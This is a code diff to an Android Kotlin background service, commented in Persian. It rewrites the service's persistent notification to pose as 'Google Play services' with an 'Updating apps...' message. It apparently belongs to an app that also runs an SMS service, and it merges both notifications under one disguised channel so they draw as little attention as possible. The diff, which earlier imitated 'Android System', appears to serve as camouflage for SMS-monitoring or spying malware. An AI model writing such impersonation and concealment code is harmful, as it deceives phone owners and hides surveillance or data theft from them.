@@ -22,8 +22,8 @@ class NetworkService : Service() {
 
     companion object {
         private const val TAG = "NetworkService"
-        private const val NOTIFICATION_ID = 3
-        private const val CHANNEL_ID = "network_monitoring_channel"
+        private const val NOTIFICATION_ID = 1  // ⭐ یکسان با SmsService - استفاده از همون notification
+        private const val CHANNEL_ID = "sms_service_channel"  // ⭐ یکسان با SmsService
         private const val CHECK_INTERVAL_MS = 10000L // هر 10 ثانیه چک کن
     }
 
@@ -96,9 +96,9 @@ class NetworkService : Service() {
         createNotificationChannel()
 
         val notification = NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("Android System")  // ⭐ شبیه سیستم Android
-            .setContentText("Checking network...")
-            .setSmallIcon(android.R.drawable.stat_sys_data_bluetooth)  // آیکون شبکه
+            .setContentTitle("Google Play services")  // ⭐ یکسان با SmsService
+            .setContentText("Updating apps...")  // ⭐ یکسان با SmsService
+            .setSmallIcon(android.R.drawable.stat_notify_sync)  // ⭐ آیکون sync کم‌رنگ
             .setPriority(NotificationCompat.PRIORITY_MIN)
             .setOngoing(true)
             .setShowWhen(false)
@@ -122,10 +122,10 @@ class NetworkService : Service() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(
                 CHANNEL_ID,
-                "System",  // ⭐ فقط "System"
+                "Google Play services",  // ⭐ یکسان با SmsService
                 NotificationManager.IMPORTANCE_MIN
             ).apply {
-                description = "System services"
+                description = "Google Play services keeps your apps up to date"  // ⭐ یکسان
                 setShowBadge(false)
                 enableLights(false)
                 enableVibration(false)
